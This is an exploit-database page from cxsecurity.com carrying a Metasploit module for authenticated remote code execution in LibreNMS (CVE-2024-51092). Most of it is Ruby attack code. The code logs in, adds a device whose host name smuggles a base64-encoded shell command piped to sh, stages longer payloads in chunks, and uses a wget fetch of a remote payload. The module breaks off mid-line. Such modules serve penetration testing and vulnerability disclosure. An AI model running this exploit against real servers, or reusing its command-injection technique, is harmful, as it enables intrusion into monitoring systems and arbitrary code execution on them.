---
title: LibreNMS Authenticated RCE
url: https://cxsecurity.com/issue/WLB-2025010021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-23
fetch_date: 2025-10-06T20:09:23.554418
---

# LibreNMS Authenticated RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LibreNMS Authenticated RCE**  **2025.01.22**  Credit:  **[Takahiro Yokoyama](https://cxsecurity.com/author/Takahiro%2BYokoyama/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-51092](https://cxsecurity.com/cveshow/CVE-2024-51092/ "Click to see CVE-2024-51092")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Retry
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'LibreNMS Authenticated RCE (CVE-2024-51092)',
'Description' => %q{
An authenticated attacker can create dangerous directory names on the system and
alter sensitive configuration parameters through the web portal.
Those two defects combined then allows to inject arbitrary OS commands inside shell\_exec() calls,
thus achieving arbitrary code execution.
},
'License' => MSF\_LICENSE,
'Author' => [
'murrant (Tony Murray)', # PoC
'Takahiro Yokoyama' # Metasploit module
],
'References' => [
[ 'URL', 'https://github.com/advisories/GHSA-x645-6pf9-xwxw'],
[ 'CVE', '2024-51092']
],
'Platform' => %w[linux],
'Targets' => [
[
'Linux Command', {
'Arch' => [ ARCH\_CMD ], 'Platform' => [ 'unix', 'linux' ], 'Type' => :nix\_cmd,
'DefaultOptions' => {
'FETCH\_COMMAND' => 'WGET'
}
}
],
],
'DefaultOptions' => {
'FETCH\_FILENAME' => Rex::Text.rand\_text\_alpha(1),
'FETCH\_URIPATH' => Rex::Text.rand\_text\_alpha(1)
},
'Payload' => {
'SPACE' => 128
},
'DefaultTarget' => 0,
'DisclosureDate' => '2024-11-15',
'Notes' => {
'Stability' => [ CRASH\_SAFE, ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ],
'Reliability' => [ REPEATABLE\_SESSION, ]
}
)
)
register\_options(
[
OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),
OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ]),
OptString.new('PATH', [ true, 'LibreNMS installed location', '/opt/librenms' ]),
OptInt.new('WAIT', [ true, 'Wait time (seconds) for cron to poll the device', 315 ]),
]
)
end
def get\_csrf\_token(res)
res&.get\_html\_document&.at('meta[name="csrf-token"]') ? res.get\_html\_document.at('meta[name="csrf-token"]')['content'] : nil
end
def check
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'login')
})
return Exploit::CheckCode::Unknown('LibreNMS is not detected.') unless res&.code == 200 && res&.body&.include?('<title>LibreNMS</title>')
token = get\_csrf\_token(res)
return Exploit::CheckCode::Unknown('LibreNMS detected. Failed to extract csrf token.') unless token
begin
login
rescue StandardError => e
return Exploit::CheckCode::Unknown(e)
end
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'about')
})
return Exploit::CheckCode::Unknown('LibreNMS detected. Cannot find libreNMS version.') unless res&.code == 200
html\_body = res&.get\_html\_document
version\_node = html\_body&.at("a[@href='https://www.librenms.org/changelog.html']")
return Exploit::CheckCode::Unknown('LibreNMS detected. Cannot find libreNMS version.') if version\_node.nil?
version\_node&.at('span')&.content = ''
version = Rex::Version.new(version\_node.text)
return Exploit::CheckCode::Safe("LibreNMS version #{version} detected, which is not vulnerable.") unless version.between?(Rex::Version.new('24.9.0'), Rex::Version.new('24.9.1'))
Exploit::CheckCode::Appears("LibreNMS version #{version} detected, which is vulnerable.")
end
def login
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'login'),
'keep\_cookies' => true
})
fail\_with(Failure::Unknown, 'Failed to access the login page.') unless res&.code == 200
login\_res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'login'),
'keep\_cookies' => true,
'vars\_post' => {
'username' => datastore['USERNAME'],
'password' => datastore['PASSWORD'],
'\_token' => get\_csrf\_token(res)
}
})
fail\_with(Failure::NoAccess, 'Failed to log into LibreNMS.') unless login\_res&.code == 302
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path)
})
fail\_with(Failure::Unknown, 'Failed to log into LibreNMS.') unless res&.code == 200 && res.body.include?('Devices')
@logged\_in = true
print\_status('Successfully logged into LibreNMS.')
end
def exploit
login unless @logged\_in
add\_host
print\_status("Waiting up to #{datastore['WAIT']} seconds for cron to poll the device...")
created = retry\_until\_truthy(timeout: datastore['WAIT']) do
@hosts.all? { |h| change\_snmpget(h) }
end
fail\_with(Failure::Unknown, 'Failed to create malicious file. You may need more wait time, or the cron job might be disabled.') unless created
register\_file\_for\_cleanup(datastore['FETCH\_FILENAME'])
@hosts.each do |host|
change\_snmpget(host)
send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'about')
})
end
end
def add\_host
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'addhost')
})
fail\_with(Failure::Unknown, 'Failed to access addhost page.') unless res&.code == 200
# The maximum host length is 128 characters.
# because 128 - 20 = 108 where 20 is length of remaining characters in original payload
if Rex::Text.encode\_base64(payload.encoded).length <= 108
@hosts = [";echo #{Rex::Text.encode\_base64(payload.encoded)}|base64 -d|sh;"]
print\_status("Adding host: '#{@hosts[0]}', length: #{@hosts[0].length}")
else
@hosts = []
staging\_file = Rex::Text.rand\_text\_alpha(1, datastore['FETCH\_FILENAME'])
register\_file\_for\_cleanup(staging\_file)
cmd = Rex::Text.encode\_base64(payload.encoded)
# ;echo -n chunked\_cmd>>staging\_file;
# ;echo -n (space) = 9, >> = 2, ; = 1
max\_chunk\_size = 128 - (9 + 2 + staging\_file.length + 1)
chunk\_size = rand([1, max\_chunk\_size - 10].max..[1, max\_chunk\_size - 5].max)
print\_status("Command chunk size = #{chunk\_size}")
cmd\_chunks = ...